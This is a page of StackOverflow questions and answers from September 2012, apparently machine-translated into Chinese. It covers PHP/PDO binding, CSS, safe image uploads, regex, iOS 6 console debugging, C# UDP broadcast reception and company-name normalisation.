# StackOverflow 问答 12587000-12587999

# php - mssql pdo If Exists 在循环中插入准备好的语句

> ID：12587008
> 
> 赞同：3
> 
> 时间：2012-09-25T16:16:42.177
> 
> 标签：php, sql-server, pdo

我有一个准备好的语句，如果行以前不存在，则该语句旨在插入行。如果只做一行，它工作正常。如果有两个，则添加第一行，忽略第二行。如果第一行存在而第二行不存在，则添加第二行并且所有后续行都失败。

实际上，插入工作一次，就好像 IF NOT EXISTS 不会更新新参数的绑定。

这是示例代码：

```
$dbConn = 'mssql:host=' . $server . ';dbname=' . $base;
$dbh = new PDO( $dbConn, $user, $pass);

// Go through each course code and add it
// Ignore if it already exists
$stmt = $dbh->prepare('IF NOT EXISTS (SELECT * FROM _ExamCoursesTEMP 
                       WHERE ExamCourseCode = :examCode AND CourseCode = :courseCode )
                       BEGIN
                             INSERT INTO _ExamCoursesTEMP ( ExamCourseCode, CourseCode ) VALUES ( :examCode2, :courseCode2 )
                       END');

$counter = 0;

foreach( $courseCodes as $courseCode )
{
    $stmt->bindParam(':examCode', $examCode );
    $stmt->bindParam(':courseCode', $courseCode );
    $stmt->bindParam(':examCode2', $examCode );
    $stmt->bindParam(':courseCode2', $courseCode );

    $updateCount = $stmt->execute();

    $counter++;
} 
```

第一个 updateCount 返回 1，其余的都是空的。

我不确定这是否是我的代码、通过 PDO 或 mssql 的怪癖准备的语句绑定的问题。

任何帮助，将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T04:09:11.270

to的第二个参数`bindParam`是通过引用传递的。因此，只需将参数绑定到变量一次，然后在循环中更改分配给同一变量的值。

# html - HTML 列表：在 LI 块中“嵌入”项目符号

> ID：12587010
> 
> 赞同：1
> 
> 时间：2012-09-25T16:16:44.907
> 
> 标签：html, css, html-lists

UL/OL 列表项目符号是否可以嵌入到 LI 的文本中，而不是有两列（左列有项目符号，右列有文本），而是只有一个列，每个 LI 的第一行的文本开始一个子弹后面几个字符？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T16:22:26.643

`ul`为您的元素使用以下 css 属性：

```
list-style-position: inside; 
```

那应该做你想做的事。

# java - 在 Mozilla 中下载 excel 时出错

> ID：12587011
> 
> 赞同：0
> 
> 时间：2012-09-25T16:16:46.450
> 
> 标签：java, jsp

在 Mozilla 中打开 excel 文件时出现错误。它在 IE 中运行良好。我有以下代码：

```
String file="abc.xls";
            response.setHeader("Content-disposition:", "attachment; filename="+file); 
            response.setContentType("application/vnd.ms-excel"); 
            response.setCharacterEncoding("UTF-8"); 
```

请建议如何解决这个问题。

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:01:07.840

您需要更新您的 Firefox 配置文件并编辑“插件 MIME 类型”信息才能处理此类文件。

检查这些页面：

[http://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data](http://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data)

[http://support.mozilla.org/en-US/kb/set-how-firefox-handles-different-file-types](http://support.mozilla.org/en-US/kb/set-how-firefox-handles-different-file-types)

# javascript - 在 iframe 中显示 pdf 在 iPad 中无法正常工作

> ID：12587015
> 
> 赞同：1
> 
> 时间：2012-09-25T16:17:01.407
> 
> 标签：javascript, ipad, html, iframe, scroll

我正在尝试使用 iframe 在 iPad 中显示 pdf，Pdf 显示在 ipad 中但无法滚动视图。我也试过 -webkit-overflow-scrolling: touch; 但它没有用。

如果有人能给我一个更好的方法来将pdf文件嵌入到带有ipad支持的html中，我将不胜感激

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-25T16:28:01.927

一旦 iframe 具有 overflow:scroll 属性，您应该能够滚动嵌入的内容，但您可能看不到滚动条

另一种解决方案是将以下 javascript 代码放在您希望能够滚动的内容中：

```
this.height=100%; 
```

# css - IE、FF 和 Chrome 中不显示某些 css.style 编辑（但在 Safari 中）

> ID：12587016
> 
> 赞同：0
> 
> 时间：2012-09-25T16:17:06.653
> 
> 标签：css, internet-explorer, firefox, google-chrome, safari

我最近对 ​​css.style（a、h3 和 .fee_note）中某些样式的编辑没有在 IE、FF 和 Chrome 中显示（但它们在 Safari 中很好）。

在测试系统中，编辑确实显示 OK，但是每次我上传一个页面（任何页面）时，css 更改都会被覆盖。在实时系统中，编辑完全被忽略。

该网站是[http://www.se1dentalcentre.co.uk/](http://www.se1dentalcentre.co.uk/)

非常感谢您的回答。

# windows - 如何在不使用任何可移动磁盘的情况下将文件从主机操作系统传输到虚拟机中运行的操作系统？

> ID：12587021
> 
> 赞同：2
> 
> 时间：2012-09-25T16:17:36.623
> 
> 标签：windows, linux, vmware

我正在尝试将 pdf 文件从我的主机操作系统（Windows 7）传输到在虚拟机（Linux-Backtrack）上运行的操作系统，而不使用任何可移动设备。正常的复制粘贴不起作用。我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T16:19:25.433

您需要共享文件夹。阅读： http: [//www.vmware.com/support/ws5/doc/ws_running_shared_folders.html](http://www.vmware.com/support/ws5/doc/ws_running_shared_folders.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-23T03:52:13.783

如果没有任何建议有效，请将您的文件放入 FAT32 格式的随身碟中。您将在 VM 窗口的右下角看到海量存储设备图标。右键单击按连接（与主机断开连接）。

作品！

# python - 烧瓶登录令牌加载器

> ID：12587029
> 
> 赞同：6
> 
> 时间：2012-09-25T16:17:51.793
> 
> 标签：python, session, authentication, flask

我正在使用 flask-login 扩展设置一个 Flask 应用程序。flask-login 文档建议设置一个替代令牌生成器，它不简单地使用用户 ID 和应用程序密码来创建会话令牌（这是默认方法）。但它没有为如何做到这一点提供任何明确的建议。

因此，对于`User.get_auth_token()`，我使用`make_secure_token`用户电子邮件和密码作为参数的函数（所以我得到了这些参数的哈希值 + 应用程序密码）。

接下来，我需要能够通过`token_loader`回调从令牌中获取用户。在 flask-login 中生成令牌的默认方法是同时包含原始用户 ID 和用户 ID + 应用程序密码的哈希值。这使得从令牌中查找用户变得非常简单——只需获取 ID 并查找用户即可。

但是我应该在会话令牌中公开用户 ID 吗？如果我不这样做，我应该将会话令牌存储在数据库中还是使用用户 ID 存储在其他地方以使查找成为可能？

简而言之：有谁知道创建安全令牌和相应`token_loader`回调的最佳实践是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T16:35:17.560

在 Flask 邮件列表中，Matt Wright 向我指出了[他](https://github.com/mattupstate/flask-security/blob/develop/flask_security/core.py#L94)在 Flask -security 扩展中的实现。他使用[itsdangerous](http://packages.python.org/itsdangerous/)创建一个签名令牌，该令牌编码一个[`URLSafeTimedSerializer()`](http://packages.python.org/itsdangerous/#itsdangerous.URLSafeTimedSerializer)由用户 ID 和密码哈希组成的序列化（通过）列表。然后可以对令牌进行解码以获取用户 ID。

# php - 通过PHP上传图片的防弹方法

> ID：12587031
> 
> 赞同：0
> 
> 时间：2012-09-25T16:18:07.750
> 
> 标签：php, image, file-upload, getimagesize

在过去的几周里，我一直在研究这个话题，我真的开始烦恼我找不到明确的答案。

我有一个网站，用户可以在其中上传自己的个人资料图片。我想确保允许上传的唯一文件是 JPEG、GIF 和 PNG

显然，使用浏览器发送的 mime 类型进行验证是一个很大的禁忌，因为它很容易被欺骗，因此排除了这种情况，而且不用说永远不要验证文件扩展名。

接下来是 PHP 提供的新的（ish）finfo 函数。我暂时一直在使用它，因为它似乎是最好的可用方法，但阅读[http://www.php.net/manual/en/ref.fileinfo.php](http://www.php.net/manual/en/ref.fileinfo.php)上的评论似乎也可以被欺骗。此外，我不确定仅检查返回的 MIME 类型是否为 image/jpeg、image/gif 或 image/png 是否过于严格？

然后是 getimagesize() 函数，我读到的任何不是看起来完美的图像的东西都返回 false，但如果是这种情况，为什么这里有这么多公认的答案说使用 finfo？

最后是 system() 或 exec() 调用，允许用户指定系统调用的一部分似乎有点危险！

所以我的问题是，我应该使用什么方法？我想让我的脚本尽可能安全，但也要足够开放，这样普通用户就不会因为他们的有效图像被脚本拒绝而受到惩罚

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:26:48.650

这只是我的 2 美分，但也许它可以提供帮助。我至少会使用以下三个步骤：

1.  首先检查带有 getimagesize() 和 MIME 类型的文件。
2.  移动文件/调整大小等时，保存不带扩展名的文件（图像仍会在不带扩展名的情况下呈现。
3.  在上传目录中使用一些 htaccess，例如：

    AddHandler cgi-script .php .php3 .php4 .php5 .phtml .pl .py .jsp .asp .shtml .sh .cgi .html .htm .js AddType text/html *.htm *.html AddType application/x-httpd -php-源 *.php

我也很想知道更多关于这个的信息！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:30:23.713

使用图片库将其打开然后重新保存将确保结果为图片。如果您不希望这样，请使用最佳可用选项（如 finfo），并确保以服务器永远不会执行的方式保存文件。禁止像 php 这样的扩展名并使用任意名称保存文件应该可以完成这项工作，**但这取决于服务器配置！**

# android - 检查 Android 上的日志文件

> ID：12587032
> 
> 赞同：0
> 
> 时间：2012-09-25T16:18:12.630
> 
> 标签：android

我为 Android 手机创建了一个应用程序。我通过 Eclipse 在设备上安装了 apk 文件。在安装或运行应用程序时，当设备使用 USB 电缆连接到计算机时，我可以在 logcat 中看到日志文件。

当设备未通过设备上的 USB 电缆连接时，我希望以相同的方式查看日志文件。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:50:32.220

您可以查看开源[android-log-collector](http://code.google.com/p/android-log-collector/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:06:01.360

我通常创建一个“LogFacade”类来控制日志输出。我的应用程序写入 LogFacade，而不是直接调用 Android 记录器。这允许我禁用生产的日志输出。LogFacade 还具有写入 SD 卡上文件的模式，并且有伴随诊断活动来读取此文件。也许你可以尝试类似的东西？祝你的项目好运。

# jquery - 限制返回的 Feed

> ID：12587033
> 
> 赞同：0
> 
> 时间：2012-09-25T16:18:14.023
> 
> 标签：jquery, rss, feed

我正在尝试对使用下面的脚本返回的 RSS 提要的数量进行限制。在一个理想的世界中，我想展示最近的 5 个提要，但我不确定如何实现这一点。我*想*我需要使用：

```
var limit = 5 
```

...某处（可能还有其他一些代码），但我没有得到任何地方。代码是：

```
jQuery.support.cors = true;
  $.ajax({
    type: "GET",
    url: "https://forumURL",
    dataType: "xml",
    success: function (xml) {
      $(xml).find("entry").each(function () {
         $("#forum").append("<li><a href='" + 
         $(this).find("link").attr("href") + "'>" + 
         $(this).find("title").text() + "</a></li>");
      });
    }
}); 
```

知道我如何只能从提要中显示 5 个结果吗？提前感谢您的任何指导。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:21:11.240

更新您的成功函数以包含计数器：

```
success: function(xml) {
    var counter = 0;
    $(xml).find("entry").each(function() {
        if (counter < 5) $("#forum").append("<li><a href='" + $(this).find("link").attr("href") + "'>" + $(this).find("title").text() + "</a></li>");
        counter++;
    });
}​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:23:10.473

您可以使用[slice](http://docs.jquery.com/Traversing/slice)函数获得第一个`limit`结果：

```
$(xml).find("entry").slice(0, limit).each(function () { /*..*/ }); 
```

# php - php mysql_connect - 与 MySQL 服务器的连接丢失

> ID：12587036
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:18:18.970
> 
> 标签：php, mysql, sql, connection

**这篇文章已经过编辑，以反映我和 iamkrillin 迄今为止的发现，因为我们是仅有的两张海报**

我有以下 VB.NET 代码正确连接，从我的 PC 运行

```
 Dim strConnection As String = "Server=dev.xxxxx.vmc;Database=report1;integrated security=SSPI;" & _ 
                                  "persist security info=False;Trusted_Connection=Yes;"

    Dim ObjDa As SqlDataAdapter = New SqlDataAdapter(pStrQuery, strConnection)

    Try
        Dim dsReturn As DataSet = New DataSet
        ObjDa.Fill(dsReturn)
        ObjDa.Dispose()
        Return dsReturn
    Catch ex As Exception
        Return Nothing
    End Try 
```

* * *

* * *

我从我们的 iSeries 运行以下 PHP 代码

```
$conn = array( 'host' => 'dev.xxxxx.vmc',
    'username' => 'vmc\adam',
    'password' => 'xxxxxx)',
    'dbname' => 'report1',
    'pdoType' => 'dblib' );

try {
    $db = new Zend_Db_Adapter_Pdo_Mssql($conn);
    $db->getConnection();
} catch (Zend_Db_Adapter_Exception $e) {

} 
```

getConnection 函数抛出错误：

> SQLSTATE[] (null) (严重性 0)

**[当我在此处](https://bugs.php.net/bug.php?id=48539&edit=1)**查找此错误时，它似乎是 5.2.10 之前的错误，我们正在运行 5.2.17。但是，其他一些评论说它仍然是 5.3 中的一个错误。

* * *

**编辑*

* * *

如果使用域帐户，似乎必须启用 Windows 身份验证。但是，它不是通过我们的PHP。所以我需要为我们的 PHP 连接设置一个特定于数据库的用户。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T18:55:06.170

在您的 VB 代码片段中，您正在连接到 SQL Server，在您的 PHP 代码片段中，您正在连接到 MySQL。如果您需要从 PHP 使用 SQL Server，请查看[此](http://msdn.microsoft.com/en-us/library/cc793139%28v=sql.90%29.aspx). 如果您在非 Windows 平台上，您可以尝试[FreeTDS](http://www.freetds.org/)。 [这](http://www.linuxjournal.com/article/6636)是一个如何开始使用它的示例

# regex - sed 删除两个模式之间的内容

> ID：12587047
> 
> 赞同：0
> 
> 时间：2012-09-25T16:19:10.477
> 
> 标签：regex, bash, text, sed

> **可能重复：**
> [使用 BASH 脚本从 HTML 表中提取数据](https://stackoverflow.com/questions/6854586/extract-data-from-html-table-with-bash-script)

我有一个包含以下内容的 html 文件。我想使用 sed 删除模式之间的所有内容（多行），`< script ..... >`并将`</script>`其余部分保持原样。我也想删除标签。

任何帮助，将不胜感激。谢谢！我尝试了以下两种方法，但都没有运气。

```
cat test.html | tr -d '\n' | sed 's/< script.*<\/script>//g' > output.txt 
```

和

```
sed '/< script/,/<\/script>/d' test.html > output.txt 
```

* * *

```
don't touch this.

this is not to be removed < script bla bla> this is to be

removed. < /script> this is going to

stay < script bla bla bla bla bla> remove this

and this 

and this < /script> and this stays as is.

this too. 
```

* * *

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T07:13:11.310

这可能对您有用（GNU sed）：

```
sed ':a;$!{N;ba};/\x00/q1;s/<\s*\/\?script[^>]*>/\x00/g;s/\x00[^\x00]*\x00//g' file 
```

它可能会失败，因为 HTML 文件包含十六进制`\x00`代码，在这种情况下返回代码将是`1`并且文件输出将保持不变。

解释：

*   `:a;$!{N;ba}`将文件 slurp 到模式空间中
*   `/\x00/q1`检查文件的十六进制`\x00`代码，如果发现退出，返回代码为`1`
*   `s/<\s*\/\?script[^>]*>/\x00/g`将所有`script`开始和结束标签替换为`\x00`
*   `s/\x00[^\x00]*\x00//g`删除`\x00`'s之间的所有内容

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:44:06.437

关于什么：

```
cat yourfile | tr -d '\n' | sed -e 's,< script.*< /script>,,g' 
```

注意结束标签中的空格

# c# - 在 C# 中接收 UDP 广播消息

> ID：12587051
> 
> 赞同：6
> 
> 时间：2012-09-25T16:19:32.300
> 
> 标签：c#, udp, broadcast, wireshark, udpclient

我知道这个问题已经被问过很多次了。我已经阅读了所有答案并尝试了我能找到的每一段代码。几天后，我非常绝望，不得不向你寻求帮助。

我的家庭网络中有一台设备和一台 PC。设备发送 UDP 广播消息。在我的电脑上，我可以在 Wireshark 中看到这些消息：

源目标长度

192.168.1.102 0.0.0.0 UDP 60 源端口：9050 目标端口：0

这意味着数据包正在到达我的 PC 上。我的下一步是创建一个接收这些数据包的 C# 应用程序。如上所述，我尝试了所有可能的解决方案，但它不会收到任何东西。

所以我想一定有一些非常基本的东西我做错了。谁能帮我吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-05T23:52:33.140

刚刚遇到同样的问题，并想分享为我解决的问题。

简而言之：Windows防火墙似乎是导致这种奇怪行为的原因，只是禁用该服务无济于事。**您必须在 Windows 防火墙入站规则列表中明确允许特定程序（可执行文件）的传入 UDP 数据包。**

有关完整的案例描述，请继续阅读。

我的网络设置是：我的（接收）机器的IP是192.168.1.2，发送机器的IP是192.168.1.50，两台机器的子网掩码都是255.255.255.0。我的机器运行的是 Windows 7 x64。

这是我使用的代码（大致）：

```
Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
IPEndPoint iep = new IPEndPoint(IPAddress.Any, 0);
sock.Bind(iep);
sock.EnableBroadcast = true;
EndPoint ep = (EndPoint)iep;
byte[] buffer = new byte[1000];
sock.ReceiveFrom(buffer, ref ep); 
```

最初这不起作用，除非我在调用它之前**从该套接字发送了一个广播数据包**`ReceiveFrom`。即在调用之前添加此行`ReceiveFrom`：

```
sock.SendTo(someData, new IPEndPoint(IPAddress.Broadcast, somePort)) 
```

当我没有先从接收套接字发送广播数据包时，它没有收到传入的广播数据包，即使它们出现在 Wireshark 中（数据包的目标是 255.255.255.255）。

我认为防火墙似乎正在处理传入的数据包（除非传出数据包首先打开某种 UDP 漏洞——尽管我之前没有听说过 UDP 打洞以某种方式适用于广播数据包），所以**我去了服务并完全禁用了 Windows 防火墙服务。这没有任何改变。**

但是，在尝试了其他所有方法之后，我重新启用了防火墙服务，并尝试再次运行该程序。这一次，出现了防火墙提示，询问我是否要允许 MyProgram.vshost.exe 进程（我在 Visual Studio 中调试）通过防火墙，我接受了它，瞧——一切正常！现在正在接收传入的数据包！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T08:52:30.140

你没关系，他们在代码中连接了一些导致问题的东西。（没看过文章，复制粘贴）

它总是在本地机器上工作，但在远程机器上它会由于某种原因失败。

要解决这个问题：在 Broadcst.cs 中，他们广播了两次。一次用于本地主机，然后用于目标 IP 地址 (iep2)。只需删除

```
sock.SendTo(data, iep1); 
```

它应该可以工作。

不知道为什么。

# java - 解析后完成对象

> ID：12587052
> 
> 赞同：0
> 
> 时间：2012-09-25T16:19:36.247
> 
> 标签：java, parsing

例如，假设我有一个通过解析文档生成的对象数组。这些对象如下所示：

```
Object{
  id
  text
  anotherProperties
} 
```

前两个属性（id和text）是在解析时设置的，但是现在我想再添加一个Properties（附加属性），在解析时不能设置，因为确定它们太复杂了，而是依赖于文本。我怎样才能以优雅的方式实现这一目标？在 Java 中？感谢您的回复

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:21:14.577

也许使用带有 Integer 键（您的 id）和 DocProperites 值的 HashMap，它由文本和 anotherProperites 组成。

然后，当您准备好设置 anotherProperties 时，您可以从 HashMap 中检索对象，然后设置它。

例如

```
Map<Integer, DocProperties> map = new HashMap(); 
```

和 DocProperties 是

```
public class DocProperties {
    private String text;
    private String anotherProperties;
    //plus the usual setters, getters and ctor
} 
```

然后当你想设置 anotherProperties 你可以调用

```
map.get(key).setAnotherProperties(....); 
```

如果你想要更动态的东西，那么你可以使用另一个 HashMap 而不是 DocProperties。然后，HashMap 可以在您解析时添加和删除键。不过我不建议这样做，因为代码可能会变得非常混乱和漏洞百出。

# objective-c - 在 Obj-C 中使用 RegEx：在配方成分中隔离杂货

> ID：12587054
> 
> 赞同：0
> 
> 时间：2012-09-25T16:19:40.950
> 
> 标签：objective-c, regex, nsregularexpression

我正在尝试使用正则表达式来过滤掉烹饪食谱成分中的测量值、准备信息和其他形容词。我想要以下结果：

给出时：

`1 cup (3oz) sliced carrots, cut lengthwise`

我想：

`carrots`

使用 Mac 应用程序“模式”处理正则表达式，以下表达式可以按需要工作：

```
(?<word>[a-zA-Z0-9]+)(?<! cut|cup|sliced|lengthwise|[(0-9)+(oz)?])\b 
```

但是，当我在以下代码中使用它时，没有匹配项 - “matches”数组为空：

```
NSString *phrase = [NSString stringWithString:@"1 cup (3oz) sliced carrots, cut lengthwise"];

NSRegularExpression *nameExpression = [NSRegularExpression regularExpressionWithPattern:@"(?<word>[a-zA-Z0-9]+)(?<! cut|cup|sliced|lengthwise|[(0-9)+(oz)?])\b" options:NSRegularExpressionSearch error:nil];

NSArray *matches = [nameExpression matchesInString:phrase
                                           options:0
                                             range:NSMakeRange(0, [phrase length])]; 
```

我正在将练习应用程序设置为使用 Obj-C 作为目标语言。为什么我没有得到任何匹配？

更新：我发现这`?<word>`是无关紧要的，问题出`?<!`在字符序列上。再次，表达式

```
([a-zA-Z0-9]+)(?<! cut|cup|sliced|lengthwise|[(0-9)+(oz)?])\b 
```

适用于我的 Objective-C 正则表达式测试器，但不适用于我的代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T22:26:50.847

@acheong87 已经指出了`[(0-9)+(oz)?]`. 与 Java 一样，NSRegularExpression 允许您在后视中使用复杂的表达式，只要它可以确定它可以匹配的最大字符数。 `[(0-9)+(oz)?]`仅消耗一个字符，因此后视中的每个替代项都有固定的长度。使用正确的版本，`[0-9]+(?:oz)?`这不再是正确的。

但无论如何，lookbehind 并不是这项工作的正确工具。（它几乎从来没有；lookbehind 可能是第二个被滥用最多的正则表达式功能，仅次于`.*?`.）

如果更正的正则表达式在测试器中有效，但在您的代码中无效，请查看单词边界。您`@"\b"`的示例代码中有可能被解释为退格字符。你应该使用的是`@"\\b"`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:30:23.473

两件事情：

```
(?<word>[a-zA-Z0-9]+)(?<! cut|cup|sliced|lengthwise|[(0-9)+(oz)?])\b 
 ^^^^^^^                                            ^^^^^^^^^^^^^ 
 1                                                  2 
```

1.  NSRegularExpression[类参考](https://developer.apple.com/library/mac/#documentation/Foundation/Reference/NSRegularExpression_Class/Reference/Reference.html)没有提到“命名捕获组”，这就是它。也许它们不受支持。

2.  目前这匹配任何由字符组成的字符串`0123456789oz+()?`。我不认为这就是你的意思；您可能想要删除外部方括号，并`0-9`用它们包围。

这会给你留下：

```
([a-zA-Z0-9]+)(?<! cut|cup|sliced|lengthwise|[0-9]+(oz)?)\b 
```

**编辑：**

不能有无限的后向断言。改用前瞻（我正在改进你的表达方式）：

```
\b(?!(?:cut|cup|sliced|lengthwise|[0-9]+(?:oz)?)\b)([a-zA-Z0-9]+) 
```

这是[一个 Rubular 演示](http://rubular.com/r/0TLAPtr0EK)。

# regex - 如何在matlab中检测字符串中的一部分表达式

> ID：12587057
> 
> 赞同：0
> 
> 时间：2012-09-25T16:19:52.930
> 
> 标签：regex, matlab, text, strcmp

例如，我输入用户名`v = ddd`。然后我有一个字符串，名称，这种形状：

```
aaa.bbb.ccc.ddd.eee 
```

我想检测我的字符串名称中是否存在（在点之间）这样的字符串，比如我的输入。我该怎么做？

我尝试了这个想法

```
str = 'REGEXP.helps.you.relax';
user = 'el'
[m s e] = regexp(str, '\w*user\w*', 'match', 'start', 'end') 
```

但我得到错误，因为不能以`'user'`这种方式将变量放在正则表达式中。我怎样才能正确地做到这一点？或者也许有任何更简单的想法？

谢谢！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:25:38.600

用作`['\w*' user '\w*']`您的第二个参数，它应该可以工作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-25T16:26:39.990

作为正则表达式的替代方法，您可以使用[`strfind`](http://www.mathworks.com/help/matlab/ref/strfind.html)，它在另一个字符串中查找一个字符串。它返回子字符串的起始索引（如果存在）和一个空矩阵向量。由于您只需要检查该字符串是否存在，一个简单的解决方案是：

```
~isempty(strfind(str,user))
% ans = 1 
```

# iphone - iOS 6 调试控制台没了？

> ID：12587063
> 
> 赞同：39
> 
> 时间：2012-09-25T16:20:20.310
> 
> 标签：iphone, ios, ios6

当我进行故障排除时，我曾经使用移动 Safari 的“调试控制台”打印出 console.log 消息。在 iOS 6 中，在 Safari 的高级设置中，“Web Inspector”取代了“Debug Console”。不幸的是，我的公司不允许我将我们正在测试的手机插入我们正在开发的计算机上。

有谁知道如何启用使用 console.log() 打印的消息以显示在 iOS 6 的 iPhone 上？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-03-22T11:31:10.720

我发现在**window.onerror**上输出任何带有警报的 JS 错误很有帮助->

```
window.onerror = function(error) {
    alert(error);
}; 
```

我将其粘贴到脚本的顶部，以便在本机警报中输出任何运行时错误。也适用于桌面。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-09-25T22:22:55.327

他们删除了它。您现在需要通过 Safari 进行调试。

[http://www.mobilexweb.com/blog/iphone-5-ios-6-html5-developers](http://www.mobilexweb.com/blog/iphone-5-ios-6-html5-developers)

它实际上很容易设置。
1) 确保您的 Web Inspector 设置已在 iPhone 设置 => Safari => 高级下打开。
2) 将手机插入 Mac OSX 计算机。
3) 打开 Safar 6 并确保开发模式在 Safari Preferences => Advanced => Show Develop Menu

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2012-09-29T16:47:38.773

如果您没有 Mac OSX，您可以使用此脚本作为控制台替换：

[https://github.com/robotnic/waterbug](https://github.com/robotnic/waterbug)

它显示错误消息，可以记录各种变量，您必须将 iPhone 或 iPad 向右旋转 90° 才能打开控制台。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-10-15T21:03:13.077

另一个可能的选择是 Steve Souders 的[移动性能书签](http://stevesouders.com/mobileperf/mobileperfbkm.php)。它包括 Firebug Lite，它有一个控制台和更多功能。它的工作方式与以前的 Mobile Safari 控制台不同，您必须连接才能使用它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-08-08T23:28:39.920

只需在屏幕底部创建您自己的控制台。这是一个快速的解决方案，但它比到处发出警报要好。确保将其放入根 html 文件（底部）或转换为所有 JS 并放入根 JS 文件（顶部）。

```
<div id="console"></div>
<style media="screen">
#console {
    resize: both;
    height :200px;
    overflow: scroll;
    background: white;
    color: black;
    border: 1px solid black;
    width: 95vw;
    padding: 5px;
    margin: auto;
}
</style>
<script type="text/javascript">
logger = (...params) => {
  const newLog = document.createElement("div");
  newLog.textContent = params.reduce((str, param) => {
      if (typeof param === 'string') return `${str} ${param}`;
      return `${str} ${JSON.stringify(param)}`;
    }, '');
    document.getElementById('console').appendChild(newLog);
  }
  window.onerror = (error) => {
    const newLog = document.createElement("div");
     newLog.style.color = 'red';
     newLog.textContent = error;
    document.getElementById('console').appendChild(newLog);
};
  console.log = logger;
  console.warn = logger;

</script> 
```

# php - $(window).load() 里面有ajax

> ID：12587065
> 
> 赞同：0
> 
> 时间：2012-09-25T16:20:32.290
> 
> 标签：php, jquery, ajax

我试图在页面加载时检索数据库中的所有数据，但是当我尝试单击刷新按钮时没有返回任何内容，你知道为什么吗？这是我的代码：

```
 $(window).load(function (){
        $.ajax({                
            url: 'get.php',
            dataType: 'json',
            success: function (data){
               $.each(data, function(i,item) {
                 $('#info').append("<p> you are:"+data[i].username+"</p> <p> your  message  is:"+data[i].msg);
               })
             }
        });

      }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:24:02.617

似乎在函数执行之前ajax没有返回。

编辑：

```
 $(window).load(function (){
      $.ajax({                
        url: 'get.php',
        dataType: 'json',
        type: 'POST', //u missed this line.
        success: function (data){
          var data_new = jQuery.parseJSON(data);     
          $.each(data_new, function(i, item) {
           $('#info').append("<p> you are:" + data_new.username +"</p> <p> your  message   is:"+data_new.msg);
           });

         }
    });

  }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:09:03.110

新答案张贴在这里。

更改您的 php 代码如下

```
if(isset($_POST['username']) && isset($_POST['msg'])){
  $username = $_POST['username'];

  $msg = $_POST['msg'];
} 
```

# comparison - 如何处理变更公司名称

> ID：12587067
> 
> 赞同：1
> 
> 时间：2012-09-25T16:20:39.867
> 
> 标签：comparison

我有一个包含公司名称列表的大表，需要一种统一公司名称的方法，例如

*   麦当劳餐厅 = 麦当劳
*   麦当劳快餐=麦当劳
*   麦当劳食品 1234 = 麦当劳
*   麦当劳 = 麦当劳
*   McDnld = 麦当劳
*   麦当劳农场不等于麦当劳
*   微软 -> 微软
*   基本要素 -> 基本要素
*   Polycom, Inc. -> 宝利通

是否可以在不单独写出每条规则的情况下做到这一点？或者至少生成某个公司名称属于某家公司的可能性百分比？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:26:58.723

如果你的不等于会更短，你可以为每一个做一个 NOT LIKE 规则。否则，SQL 真的无法区分彼此。我要做的是制作一个全球公司表，该表将保存基本名称并使用基本商店 ID 绑定到子表。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:23:57.343

尝试：

```
SELECT FROM `company` WHERE `name` LIKE
    "%McDonalds%Food%" or "%McDonalds%Restaurant%" 
```

您需要单独处理每种情况，因为您明确`%Farm`从结果集中排除。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T16:51:48.977

The short answer is...no, at least not in SQL.

This sort of heuristic matching of names has been the subject of a lot of [research](http://www.cs.umd.edu/class/spring2012/cmsc828L/Papers/CohenIJCAI03.pdf).

*   [How can I measure the similarity between 2 strings?](https://stackoverflow.com/questions/1034622/how-can-i-measure-the-similarity-between-2-strings)
*   [A Comparison of String Distance Metrics for Name-Matching Tasks](http://dc-pubs.dbs.uni-leipzig.de/files/Cohen2003Acomparisonofstringdistance.pdf)
*   [A Fast Heuristic for Approximate String Matching](http://reference.kfupm.edu.sa/content/f/a/a_fast_heuristic_for_approximate_string__105861.pdf)
*   [A Guided Tour to Approximate String Matching](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.21.3112)

